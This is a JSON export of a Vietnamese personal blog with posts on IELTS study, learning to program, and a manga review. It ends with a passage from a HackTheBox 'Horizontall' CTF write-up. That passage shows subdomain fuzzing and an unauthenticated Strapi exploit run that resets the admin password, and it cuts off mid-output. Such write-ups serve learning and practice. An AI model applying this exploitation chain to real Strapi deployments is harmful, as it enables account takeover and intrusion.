[{"content":"I. Lời dẫn Mình đã đạt được 7.0 IELTS.\nCụ thể, điểm thành phần bao gồm:\n Writing: 6.5 Listening: 7.0 Reading: 7.0 Speaking: 7.5  Đó không phải một thành tựu lớn, mà ngược lại, còn thấp hơn so với những điểm số \u0026ldquo;đáng để khoe\u0026rdquo; khác. Thế nhưng, điểm quan trọng là:\nMình hầu như không ôn gì cả.\nMình không theo học khóa nào hết. Cũng không liên tục cày đề như nhiều người.\nChỉ đơn giản là một ngày nọ, mình đi thi thử để xem bản thân ở đâu, và bỗng thấy mình làm tốt hơn kì vọng. Bởi vậy, thông qua bài đăng này, mình muốn chia sẻ một phương pháp đã hiệu quả với mình, hi vọng có thể cho bạn một chút gì để tham khảo chăng.\nII. Phương pháp học IELTS của mình Một cách trung thực, năm lớp 9, điểm tiếng Anh của mình thuộc hàng cuối lớp. Khi ấy, mình không có hứng, và cũng hoàn toàn không có lý do để học tiếng Anh nhiều hơn mức độ qua môn.\nTuy vậy, năm lớp 10, một sự kiện xảy ra đã ép mình phải học tiếng Anh nghiêm túc - đó là mình bắt đầu học chuyên Tin.\nNhư mình đã viết trong một bài đăng khác, để học lập trình, kĩ năng ngôn ngữ Anh là yếu tố bắt buộc. \u0026ldquo;Bạn viết code đúng không ai biết bạn là ai, bạn viết document sai bạn là thằng phá hoại\u0026rdquo;. Và từ đó, mình đã ✦vô cùng tự nguyện✦ phải học tiếng Anh.\n1. Reading Mình thích đọc, và mình đọc truyện rất nhiều. Nhưng tuyệt đối không phải là truyện tiếng Anh. Văn học thực sự không còn chút sức hút khi các câu được liên kết bởi những lần đi tra từ điển thay vì dấu chấm.\nThầy cô có dạy, việc dễ làm trước, việc khó để sau. Nên trước khi học Reading, mình đã lập ra một danh sách những bộ manga có-vẻ-thú-vị đã được dịch sang tiếng Anh, và ngồi đọc dần. Tổng thể giai đoạn này hoàn toàn không có cảm giác học tập một chút nào.\nĐôi khi trong lúc đọc, dù chỉ là manga, bạn vẫn có thể gặp những từ bản thân không biết. Một phương thức cơ bản để ghi nhớ những từ gặp ngoài hoang dã như vậy là sử dụng flashcard, ví dụ như Anki.\n  Một ví dụ cho từ skimpy, Sono Bisuku Douru wa Koi o Suru     Một ví dụ khác cho từ unanimous, Yamada-kun to Nananin no Majo  Dễ thấy, việc có thêm hình ảnh, hoàn cảnh và nhân vật vào trong việc học từ vựng là một điểm cộng vô cùng lớn. Ngoài ra, Anki còn hỗ trợ file âm thanh trong mỗi flashcard. Nếu bạn cần tìm file âm thanh cho một từ vựng mới, nó thường nằm ở:\nhttps://ssl.gstatic.com/dictionary/static/sounds/oxford/\u0026lt;từ bạn muốn tìm\u0026gt;--_\u0026lt;ngữ âm (Anh Anh hoặc Anh Mỹ)\u0026gt;_1.mp3 Ví dụ, bạn muốn tìm từ patriotism trong cách đọc Anh Mỹ, nó nằm ở đây: https://ssl.gstatic.com/dictionary/static/sounds/oxford/patriotism--_us_1.mp3.\nSau màn dạo đầu với manga, mình bắt đầu bước sang những cuốn tiểu thuyết thật. Bắt đầu từ Harry Potter là bộ truyện mình đã luôn thích từ bé, và quan trọng hơn - có nguyên tác tiếng Anh.\n  Toàn bộ 7 tập truyện Harry Potter  Xuyên suốt toàn bộ 7 tập truyện, bạn có thể để ý rằng giọng văn và cách dùng từ của J.K.Rowling trở nên phức tạp, \u0026ldquo;trưởng thành\u0026rdquo; dần. Không chỉ là một câu truyện đầy cuốn hút, Harry Potter chắc chắn là một nguồn học tiếng Anh vô cùng thích hợp.\nGì\u0026hellip;? Thiếu á? Không, mình không biết đứa trẻ bị nguyền rủa nào hết\u0026hellip;\nVà như vậy, thực tế tới tận lúc thi mình vẫn chưa từng đọc một bài đọc IELTS nào.\n2. Writing Đây là phần mình chỉ đạt điểm trung bình - mình đã làm bài với không gì hơn ngoài sự tự tin, lòng quả cảm và cái đầu trắng như chính tờ giấy thi trước mặt.\nCũng bởi vậy, mình không thể nói nhiều về phần này. Mình hầu như không viết, bởi dù viết cũng không có tiêu chí để chấm bản thân đúng hay sai. Tuy vậy, có một sự thật chắc chắn rằng, điểm bài viết là hàm đồng biến với điểm bài đọc của bạn - bạn càng đọc nhiều, kĩ năng viết của bạn càng cải thiện.\nCó một điều đáng nhớ duy nhất trong phần này, đó là dạng chung của mọi bài luận IELTS:\n Mở đầu: nhắc lại câu hỏi, nhưng hãy paraphrase Tổng quan (overview) (có thể có, có thể không) Luận điểm 1 Luận điểm 2 Kết bài (chỉ khi không có phần tổng quan)  Và nhớ, paraphrase, paraphrase, paraphrase - điều quan trọng phải nhắc lại 3 lần. Paraphrase mọi vị trí có thể. Giám khảo sẽ không tính số từ những đoạn lặp từ quá dài, nên hãy nhớ, paraphrase, paraphrase, paraphrase!\n3. Speaking \u0026ldquo;Speaking\u0026rdquo;, tức là nói. Vậy để nói giỏi, bạn cần làm gì?\nĐơn giản thôi, nói thật nhiều. Nghĩ thầm trong đầu hay nói lớn thành tiếng, quan trọng là giữ cho bản thân nói tiếng Anh nhiều nhất có thể.\nBước tiếp theo là gom đủ dũng khí và nói tiếng Anh với người nước ngoài. Và đây có lẽ là bước quan trọng nhất.\n Nhìn quen chứ?\nLàm nhiều thì sai nhiều, làm ít thì sai ít, còn không làm thì không sai. Với tư tưởng đó, nhiều người đã chọn cosplay \u0026ldquo;Komi không thể nói chuyện\u0026rdquo; và \u0026ldquo;Shouko bị khiếm thính\u0026rdquo; cùng một lúc. Thế nhưng, nếu bạn có đủ can đảm để sai, và sai rất nhiều, thì quá trình học Speaking lại vô cùng đơn giản.\nCá nhân mình, mình đã tham gia một server Discord học tiếng Anh, vào voice chat và bắt đầu chém gió. Khi cảm thấy bản thân đã đủ khả năng đấu kiếm bằng miệng với thiên hạ, mình bắt đầu tải và trải nghiệm một \u0026ldquo;metaverse\u0026rdquo; bản toxic tên VrChat.\n  VrChat, nơi bạn trở thành nhân vật ảo và trò chuyện với mọi người  Bước cuối cùng là uống đủ nước, gây ấn tượng tốt ban đầu, và giữ bình tĩnh trong lúc thi. Hiểu rằng giám khảo không ngắt lời vì bạn nói tệ, mà vì họ cũng có giới hạn thời gian, nên không cần hoảng khi bị ngắt lời.\nVà ngoài ra, kĩ năng nói được dựa trên một nhân tố không thể thiếu, chính là kĩ năng tiếp theo.\n4. Listening Ngoài việc nghe từ mới trong Anki flashcard mình đã nói qua trong phần Reading, còn một điều quan trọng khác bạn phải nhớ.\n  Bảng kí hiệu ngữ âm tiếng Anh quốc tế  Chính là cái bảng trông như tiếng Latin này.\nMình không biết nó nằm đâu trong chương trình giáo dục phổ thông, nhưng khả năng đọc bảng này là một phần không thể thiếu trước khi bạn tra từ điển.\nChỉ với lượng kiến thức lớn bằng một phần mười bảng tuần hoàn hóa học này, bạn đã có thể đọc và nghe từ vựng khá chính xác rồi.\nPhần lớn tư liệu mình nghe đều đến từ những cuộc đối thoại trên Discord hay VrChat. Ngoài ra, Youtube cũng là một nguồn tư liệu \u0026ldquo;vừa học vừa chơi\u0026rdquo; rất lớn, và nó miễn phí.\nTới gần thời điểm thi, mình còn làm vài bài trên kênh The IELTS Listening Test, để làm quen với dạng của đề. Đây là một kênh Youtube tốt, với điểm cộng là tốc độ ra video, và điểm trừ là độ chính xác của đáp án tham khảo.\nIII. Lời kết Có thể nói, mình đã học rất nhiều. Cũng có thể nói, mình chẳng học gì cả.\nManga, Harry Potter, VrChat hay Discord, tất cả đều là \u0026ldquo;chơi\u0026rdquo;. Nhưng có vài sự khác biệt căn bản - đó là mình ghi và học lại từ mới trong Anki, và đã cạy miệng bản thân ra để thực sự trò chuyện với người nước ngoài. Khi đó, chỉ việc thưởng thức các hình thức giải trí bằng tiếng Anh cũng đã đủ để khiến mình tiến bộ.\nHi vọng bạn đã có thể tham khảo một chút gì đó từ những chia sẻ của kẻ lười này. Cứ liên lạc trực tiếp với mình nếu cần bất cứ sự giúp đỡ nào, và chúc may mắn trên hành trình học tiếng Anh của bạn!\n","permalink":"https://git-akihakune.github.io/vi/blog/ielts/","summary":"Hay quá trình học và thi IELTS của mình","title":"Cách đạt 7.0 IELTS cho người lười"},{"content":"I. Giới thiệu \u0026ldquo;Mình muốn học lập trình, nhưng làm thế nào để bắt đầu?\u0026rdquo;\nlà câu hỏi mình thường gặp nhất, và đồng thời, cũng có nhiều câu trả lời khác nhau nhất. 5 giây tra Google có thể dẫn bạn đến những video chất lượng như thế này:\nMột video chứa những kiến thức cơ bản bạn nên xem Bản thân mình, tuy không kém ai, nhưng cũng chẳng hơn ai - là một học sinh hết sức bình thường với chút ít kiến thức công nghệ thông tin. Tuy nhiên, bởi \u0026ldquo;vạn sự khởi đầu nan\u0026rdquo; nên giờ đây, mình muốn chia sẻ \u0026ldquo;bước đầu tiên\u0026rdquo; của mình, để các bạn có cái nhìn chung về thế giới công nghệ và lựa chọn cho bản thân một lối đi phù hợp.\n II. Giải đáp về lập trình \u0026ldquo;Mình có nên học công nghệ thông tin không nhỉ?\u0026rdquo; thường chính là câu tự vấn đầu tiên. Văn mẫu về \u0026ldquo;thằng em 96 học IT\u0026rdquo; khiến các bạn nghĩ rằng ngành công nghệ thông tin thật ngầu, làm việc với máy tính trong phòng điều hòa lại thật nhàn, thật hiện đại và thu nhập thì quả là đáng mơ ước. Nhưng các bạn đắn đo và do dự, nghĩ rằng đó là công việc chỉ của riêng những bậc anh tài với mức IQ và lượng synapse nhất định.\nKhông có đâu.\nQuả đúng là việc lập trình yêu cầu những kĩ năng logic nhất định. Tuy nhiên, đó là thứ có thể tập luyện được. Với kĩ năng Google vừa đủ, mọi người đều có thể viết code.\n \u0026ldquo;Mọi kẻ khờ đều có thể viết code mà máy hiểu được. Chỉ có lập trình viên giỏi mới viết code con người hiểu được.\u0026rdquo;\n  - Martin Fowler -\n Mặc khác, không thể nói điều tương tự với việc ngồi trước máy tính và sửa lỗi liên tục trên 12 tiếng 1 ngày. Thêm vào đó, tuổi nghề trung bình của lập trình viên lại vô cùng ngắn - sẽ cán mốc cuối vào khoảng 35 đến 40 tuổi. Đó là khi bạn sẽ không còn sức để tiếp tục theo đuổi các công nghệ mới, và phải chuyển sang phần nhân sự hoặc quản lý.\nNếu cảm thấy những điều đó vẫn ổn với bạn, thì chúng ta đến với câu hỏi tiếp theo:\n\u0026ldquo;Mình nên bắt đầu học từ ngôn ngữ nào nhỉ?\u0026rdquo;\n Nếu so sách với việc chọn Pokemon vào khởi đầu chuyến hành trình, thì đây là sự chần chừ khi đứng trước cửa phòng thí nghiệm. Các bạn sợ \u0026ldquo;một bước sai vạn dặm đau\u0026rdquo;. Tuy nhiên, với câu hỏi này, mình hoàn toàn có thể trả lời rằng.\nĐó là tiếng Anh.\n Điều kiện tiên quyết khi học công nghệ thông tin là tiếng Anh. Không cần IELTS hay TOEIC, nhưng bạn cần biết đọc đủ nhanh và hiệu quả, bởi tài liệu, thuật ngữ, hướng dẫn, chú thích - mọi thứ đều được viết bằng tiếng Anh. Còn tài liệu tiếng Việt, hi vọng bạn tìm được phiên bản nào đó không bị lỗi thời ít nhất 5 năm.\nMặt khác, nếu bạn thực sự hỏi về ngôn ngữ lập trình, vậy hãy đặt câu hỏi rằng bạn muốn viết gì? Desktop app? Web app? Android/IOS app? Game? Vậy thì mở Google ra, tìm programming languages for game chẳng hạn, và bắt đầu tại đó thôi! Ngược lại, nếu bạn vẫn chưa xác định được mình muốn làm gì, bạn có thể tham khảo biểu đồ sau:\n Điều quan trọng thực chất không phải ngôn ngữ khởi đầu, mà là những khái niệm về lập trình - biến, hàm, đối tượng, trình thông dịch và trình biên dịch,\u0026hellip; Những khái niệm đó là bất biến và hầu như không đổi trong phần lớn các ngôn ngữ lập trình. Khi bạn nắm được một ngôn ngữ, sử dụng những ngôn ngữ khác chỉ là công việc tra Google rồi lắp từ tạo câu - với tiền đề là bạn phải biết từ khóa cần tra.\nIII. Hành trình công nghệ của mình Năm lớp 10, mình thi đỗ chuyên Tin, và từ đó giới hạn thời gian sử dụng máy tính của mình được gỡ bỏ. Như mọi chú gà khác, mình bắt đầu từ việc cài Code Blocks, bắt đầu tìm hiểu về cấu trúc dữ liệu và giải thuật trong C++.\nĐại loại thì đoạn chương trình đầu tiên của mình trông như thế này:\n#include \u0026lt;iostream\u0026gt;using namespace std;  int main() {  cout \u0026lt;\u0026lt; \u0026#34;Hello world\u0026#34; \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } Quá trình học chuyên đề đầy đau khổ đã dạy mình về logic và các cấu trúc dữ liệu, và đồng thời, là phong cách code xấu nhất có thể.\nGiữa quá trình học chuyên đề, mình cũng tự tìm hiểu về những công cụ mà lập trình viên thực sự sử dụng. Mình bắt đầu vọc vạch Linux, bắt đầu từ Linux Mint. Mình nhảy qua Sublime Text, rồi Atom, và hiện tại đang dừng ở VS Code cùng Neovim.\n  Có rất nhiều code editor, và lựa chọn sử dụng hoàn toàn thuộc về sở thích cá nhân mỗi người  Kết thúc quá trình học chuyên đề, việc đầu tiên mình làm là dành 1 tuần để nhảy distro - tức là liên tục cài một hệ điều hành Linux, chỉnh sửa sao cho vừa ý, rồi lại xóa sạch ổ đĩa đi để cài một hệ điều hành khác. Mình đã thử Ubuntu, Debian, Elementary OS, Deepin, Fedora, Parrot OS, Manjaro, Zorin OS, Pop!_OS, Puppylinux, Haiku, CentOS, Arch, và Gentoo. Cuối cùng, mình kết luận là mình cần một cái gì đó đơn giản, ngốn ít tài nguyên, bền và đẹp, nên tuần trước mình đã quay lại với Linux Mint.\n  Tương tự, distro tốt nhất chính là distro phù hợp với cá nhân mỗi người  Sau đó, không vì một lý do cụ thể nào, mình nghĩ rằng mình muốn làm web, và liền đó, mình học làm web. Khởi đầu từ những kiến thức front-end cơ bản trên MDN Web Docs, mình quyết định sẽ làm nên một trang blog cá nhân. Trong quá trình thực hiện, mình đã học được rất nhiều phần về công nghệ web - các ngôn ngữ, framework, công cụ,\u0026hellip; Hiện tại thì nó nằm ở đây, với mục đích kỉ niệm: https://hakune-blog.herokuapp.com/.\nVà rồi, cũng không vì một lý do cụ thể nào, mình nghĩ rằng mình muốn làm app Android - kéo theo đó là quá trình học Dart và Flutter.\n Sau đó, mình cũng đã thử nghiệm với nhiều mảng khác - khoa học dữ liệu (chủ yếu trên Kaggle), lập trình game (mình chọn Unity), blockchain (trên nền tảng Etherium), lập trình nhúng, IoT,\u0026hellip; Mỗi ngày đều dành một lượng thời gian đến hại sức khỏe để liên tục viết code và trải nghiệm.\nCàng về sau, Python càng tỏ ra thập phần hữu dụng. Cũng bởi vậy, mình đã nghĩ, sao không thử đào sâu vào ngôn ngữ này xem. Và thế là mình làm một vài app CLI đơn giản bằng Python, cũng đã học hỏi được rất nhiều điều.\nRồi một ngày nọ, mình xem Mr.Robot.\n  Mr.Robot - bộ phim truyền hình nổi tiếng của Mỹ xoay quanh hacker Elliot  \u0026ldquo;Đây chính là thứ mình muốn làm!\u0026rdquo;, mình đã nghĩ thế. Và không chút chần chừ, mình đi tìm hiểu những phương pháp và nền tảng để học bảo mật thông tin. Bắt đầu từ Try Hack Me để có cái nhìn cơ bản về những lĩnh vực trong bảo mật thông tin, mình quyết định sẽ thử nghiệm với kiểm thử xâm nhập (penetration testing). Và đó là mình hiện tại.\nMột cách trung thực, hơn 1 năm là quãng thời gian tương đối ngắn để có cái nhìn sâu sắc về các lĩnh vực trong ngành IT. Tuy nhiên, mình đã tìm hiểu, trải nghiệm, tìm được hướng đi cho sự nghiệp của mình, và mình tự hào về điều đó.\nIV. Tiếp theo là? Thế giới công nghệ là vô cùng tận. Mỗi ngày Github chào đón các nhà phát triển bằng một quả cầu thể hiện thế giới phần mềm đang tăng tốc nhanh thế nào. Khi bạn mở mắt thức dậy, một công nghệ cũ lại trở nên lỗi thời, và một công nghệ mới lại được sinh ra.\n  Mỗi tia màu tím là một Pull Request  Bởi vậy, cách duy nhất để bắt kịp chính là học. Học liên tục. Học đến khi không thể tiếp tục được nữa - khi đó bạn sẽ trở thành quản lý, trông nom một thế hệ kế tiếp lại liên tục học và phát triển.\nHi vọng câu chuyện nho nhỏ trên của mình đã giúp bạn kiếm tìm được một động lực học tập cho bản thân.\nNgày 7 tháng 3 năm 2022, mình lại ngồi bên máy tính và tạo ra thế giới.\n","permalink":"https://git-akihakune.github.io/vi/blog/my-programming-journey/","summary":"Quá trình mình học về lập trình và công nghệ","title":"Hành trình công nghệ của tôi"},{"content":" Chú thích: Bài vốn được viết bằng tiếng Anh vào ngày 9 tháng 10 năm 2021. Đây là bản dịch trực tiếp. Chào mừng, những đồng chí yêu thích manga.\nGần đây, mình đã đọc một bộ manga tên  The Duke of Death and his Black Maid ( 死神坊ちゃんと黒メイド), viết bởi Inoue Koharu. Vào thời điểm viết bài, đã có 197 chương manga được phát hành và mùa đầu tiên của anime cũng vừa được công chiếu, với tổng cộng 12 tập. Đồng thời, mùa 2 của anime cũng đã được lên lịch phát hành.\nVới những ai đến đây chỉ để tìm nguồn truyện, bạn có thể tìm bản dịch (tiếng Anh) đầy đủ nhất ở Kirei Cake. Bản dịch của họ rất mượt và phần edit đã được làm gần như hoàn hảo. Dù vậy, bạn vẫn nên xem xét việc mua bản manga để ủng hộ công sức của tác giả.\nI. Bối cảnh và tóm tắt  Công tước tử thần và nàng hầu gái đen là một bộ romcom của Koharu Inoue, được xuất bản theo kì trên Shogakukan\u0026rsquo;s Sunday Webry kể từ tháng Mười năm 2017, mới đây đã được thu thập thành 13 cuốn tankōbon vào tháng Bảy 2021.\nCâu truyện lấy bối cảnh ở một thế giới viễn tưởng, nơi phù thủy sống giữa loài người, dựa theo châu Âu thời kì cân hiện đại sau chiến dịch săn phù thủy. Chàng công tước của chúng ta bị ếm lên một lời nguyền bi kịch - cậu sẽ khai tử vạn vật chỉ bằng một cú chạm. Do đó, cậu bị cô lập trong một dinh thự như một cách biệt cư, đồng hành bởi người quản gia tận tụy Rob và người hầu gái đen thích tán tỉnh Alice.\n Từng chút một, cậu dần nhận ra cảm xúc của cậu đối với Alice đang dần trở nên mất kiểm soát. Cậu cảm nhận được sự tận cùng bất lực khi không thể ôm lấy những người cậu yêu thương. Bởi vậy, cậu đặt mục tiêu phải gỡ bỏ lời nguyền đã bị ếm lên cậu.\nBộ manga lấy một bối cảnh khá độc đáo (về chủ đề, về các mối quan hệ, \u0026hellip;) mà cá nhân mình cảm thấy vô cùng mới mẻ và thú vị. Tuy khó liên kết với bối cảnh hiện đại của người đọc, song lại có một bầu không khí u ám và thảm khốc rất riêng. Do đó, phần này mình chấm 9.5 trên 10.\nII. Nét vẽ  Mình vẫn chưa có cơ hội trải nghiệm bản anime. Tuy nhiên, về bản manga - mình phải nói rằng nó lộng lẫy một cách khác thường. Cả thiết kế nhân vật và khung cảnh đều thể hiện được rõ bối cảnh có phần tối tăm, huyền bí, trong khi vẫn giữ được một nét rất-manga của câu truyện. Đôi lúc tạo hình nhân vật cũng có thể đem lại một ấn tượng sơ sài, nhưng chính những vẻ một màu đó đã tô điểm cho cá tính của nhân vật theo một cách rất riêng. Xuyên suốt mạch truyện, bạn cũng có thể thấy các nhân vật trong nhiều phục trang khác nhau, về mặt tổng quan lại khoác lên thêm một lớp chân thực cho cá tính của họ.\nKết luận, mình đánh giá nét vẽ 9 trên 10 điểm.\nIII. Nhân vật Đây là tạo hình của các nhân vật chính:\n  Các nhân vật chính trong phần đầu truyện  Tuy nhiên, câu truyện còn nhiều hơn nữa, với cốt truyện tương đối cuốn hút cho mọi nhân vật. Mình không nên hé lộ nhiều, đề phòng những spoiler vô tình nếu bạn chưa tự mình trải nghiệm câu truyện. Dù vậy, mình là một người hâm mộ lớn của những mối quan hệ tuổi thơ ấu, và mình đã không thất vọng. Các mối quan hệ đã được xây dựng kĩ lưỡng, và tương tác giữa các nhân vật diễn ra một cách chân thực. Tuy vậy, số lượng nhân vật xuất hiện về sau đang khiến sơ đồ những mối quan hệ trở nên khó nắm bắt dần, là một điều hoàn toàn có thể cải thiện.\nBản thân mình cảm thấy đồng cảm nhất với Walter - có lẽ là nhân vật được xây dựng sâu sắc nhất về mặt tâm lý: Cậu con trai thứ, hoàn hảo về mọi mặt nhưng luôn cảm thấy bị thua kém anh trai bởi không có quyền thừa kế gia tộc. Walter hẳn chính là nhân vật chân thực nhất, bởi lẽ sự phát triển nhân vật và chuyển biến tâm lý của cậu cũng đã được thể hiện hợp lý và cuốn hút nhất trong manga.\n Đồng thời, mình cũng có ấn tượng mạnh với quá khứ của tên dê mặt chim Zain và nội tâm bí ẩn của phản diện chính là Sade. Dự đoán trong những chương kế tiếp, cả hai nhân vật sẽ tỏa sáng trong mạch truyện chính.\nVề mặt tổng thể, mình đánh giá cách xây dựng và phát triển nhân vật 8 trên 10.\nIV. Cốt truyện Thú vị là, mặc dù có bối cảnh tương đối độc đáo,  Công tước tử thần và nàng hầu gái đen lại bắt đầu như một bộ romcom thông thường.\nCâu truyện, về mặt tổng thể, đã làm rất tốt trong việc mở rộng vấn đề chính - là lời nguyền của công tước. Tuy nhiên, mạch truyện nhìn chung không được liền mạch, và đó là một điểm trừ: số lượng chương chỉ có yếu tố romcom và không đóng góp gì vào mạch truyện chính ở đầu có thể khiến một số người cảm thấy nhàm chán, nhưng về nửa sau câu truyện, những chuyển biến mới trong tình huống, trong nhân vật và cả trong bối cảnh xuất hiện ngày một nhiều. Ngược lại, nếu bạn là một độc giả yêu thích thể loại Slice of Life, bạn chắc chắn sẽ không có một phút giây nhàm chán nào trong cả câu truyện: ecchi nhưng không gây phản cảm, ngọt nhưng không gây sốc đường, một thiên tiểu thuyết vô cùng ấm lòng.\nNhìn chung, mạch truyện là thẳng - tức là sẽ không có những plot twist khiến bạn phải bàng hoàng lật lại 100 chương trước và tự vấn tại sao bản thân không nhận ra (không như thằng trầm cảm cắn tay đi ngược thời gian nào đó). Cả những mẩu truyện đời thường nhẹ nhàng giúp độc giả có cái nhìn sâu sắc hơn vào nội tâm nhân vật, hay những đoạn hành động mang màu sắc huyền bí của các phù thủy, đều có thể khiến bạn cười ra nước mắt, lăn lộn trên sàn xấu hổ giùm nhân vật, hoặc ngạt thở chứng kiến diễn biến trong chương truyện tiếp theo. Bởi vậy, mình cho rằng phần cốt truyện nằm trên thang điểm 8.5 trên 10.\n Tiểu kết Hi vọng một chút cảm nhận trên đã giúp bạn có được cái nhìn chung về  Công tước tử thần và nàng hầu gái đen. Về mặt tổng quan, mình cá bộ truyện này chắc chắn sẽ không làm bạn thất vọng. Thay lời kết, mình xin tặng bạn: đường dẫn đến chương 1.\n","permalink":"https://git-akihakune.github.io/vi/blog/black-maid/","summary":"Một chút về「Công tước tử thần và nàng hầu gái đen」","title":"[Manga Review] Công tước tử thần và nàng hầu gái đen"},{"content":"I. Quét dịch vụ Như mọi khi, chúng ta bắt đầu bằng việc quét dịch vụ:\n# Nmap 7.92 scan initiated Fri Jan 14 02:48:59 2022 as: nmap -sC -sV -oN nmap.txt 10.10.11.105 Nmap scan report for 10.10.11.105 Host is up (0.039s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Did not follow redirect to http://horizontall.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 14 02:49:13 2022 -- 1 IP address (1 host up) scanned in 13.50 seconds Bạn để ý dòng này không?\nhttp-title: Did not follow redirect to http://horizontall.htb Về cơ bản, chúng ta phải thêm một dòng nữa vào file /etc/hosts, đại khái như này:\n10.10.11.105 horizontall.htb Chạy nmap lần nữa, ta được kết quả:\n# Nmap 7.92 scan initiated Fri Jan 14 02:59:54 2022 as: nmap -sC -sV -oN nmap.txt 10.10.11.105 Nmap scan report for horizontall.htb (10.10.11.105) Host is up (0.042s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA) | 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA) |_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: horizontall Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 14 03:00:05 2022 -- 1 IP address (1 host up) scanned in 10.60 seconds Quét tất cả các cổng cũng không tiết lộ gì hơn, do đó mình thử kiểm tra dịch vụ HTTP trong trình duyệt: Nhưng chẳng bấm được gì cả. Đồng thời, gobuster cũng vừa kịp trả về kết quả:\n$ gobuster dir -r -u http://horizontall.htb -o gobuster.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://horizontall.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Follow Redirect: true [+] Timeout: 10s =============================================================== 2022/01/14 03:18:57 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 403) [Size: 178] /css (Status: 403) [Size: 178] /js (Status: 403) [Size: 178]  =============================================================== 2022/01/14 03:25:24 Finished =============================================================== Không có gì mới, nhỉ? Mình cũng đã kiểm tra mã nguồn javascript nhưng có vẻ không có gì mới lạ hết.\nLúc này, mình chợt nhớ tới một mẹo ctf nhỏ - nếu thử thách yêu cầu bất cứ sự thay đổi nào trong file /etc/hosts, đáp án chắc hẳn nằm đâu đó trong các tên miền phụ. Do đó, mình thử quét các tên miền phụ, câu lệnh như sau:\nwfuzz --oF wfuzz -c -f wfuzz.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#34;http://horizontall.htb\u0026#34; -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; --hc 301 Và nó chạy một cách hoàn hảo:\n$ wfuzz --oF wfuzz -c -f wfuzz.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u \u0026#34;http://horizontall.htb\u0026#34; -H \u0026#34;Host: FUZZ.horizontall.htb\u0026#34; --hc 301 ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ********************************************************  Target: http://horizontall.htb/ Total requests: 114441  ===================================================================== ID Response Lines Word Chars Payload =====================================================================  000000001: 200 1 L 43 W 901 Ch \u0026#34;www\u0026#34; 000047093: 200 19 L 33 W 413 Ch \u0026#34;api-prod\u0026#34;  Total time: 641.3004 Processed Requests: 114441 Filtered Requests: 114439 Requests/sec.: 178.4514 Mất khoảng 10 phút để chạy trong một máy ảo hạng xoàng. Dù vậy, chúng ta đã tìm ra một hướng tấn công mới - điểm đầu cuối api-prod.\nNhưng trước hết, chúng ta cần thêm nó vào file /etc/hosts đã.\n10.10.11.105 api-prod.horizontall.htb II. Tấn công API Khi mở ra trong browser, chúng ta tìm thấy: Ừm thì, cảm ơn\u0026hellip;?\nChúng ta sẽ làm theo đúng quy trình với điểm đầu cuối API này. Đây là kết quả quét gobuster:\n/reviews (Status: 200) [Size: 507] /users (Status: 403) [Size: 60] /admin (Status: 200) [Size: 854] /Reviews (Status: 200) [Size: 507] /Users (Status: 403) [Size: 60] /Admin (Status: 200) [Size: 854] /REVIEWS (Status: 200) [Size: 507] /%C0 (Status: 400) [Size: 69] /%C0~ (Status: 400) [Size: 69] /%C0.bak (Status: 400) [Size: 69] /%C0.bak2 (Status: 400) [Size: 69] /%C0.old (Status: 400) [Size: 69] /%C0.1 (Status: 400) [Size: 69] /.%C0.swp (Status: 400) [Size: 69] Như bạn có thể thấy, có rất nhiều thứ thú vị để thử ở đây. Nhưng trước nhất, thử đi đến /admin nào.\n Vậy công nghệ phía sau là strapi. Tìm kiếm nhanh bằng searchsploit tiết lộ một lỗ hổng RCE chí mạng.\n$ searchsploit strapi ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------  Exploit Title | Path ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Strapi 3.0.0-beta - Set Password (Unauthenticated) | multiple/webapps/50237.py Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated) | multiple/webapps/50238.py Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results Cứ chọn một cái bạn thích và chạy nó. Ở đây, mình dùng 50239.py:\n$ python3 50239.py http://api-prod.horizontall.htb [+] Checking Strapi CMS Version running [+] Seems like the exploit will work!!! [+] Executing exploit   [+] Password reset was successfully [+] Your email is: admin@horizontall.htb [+] Your new credentials are: admin:SuperStrongPassword1 [+] Your authenticated JSON Web Token: 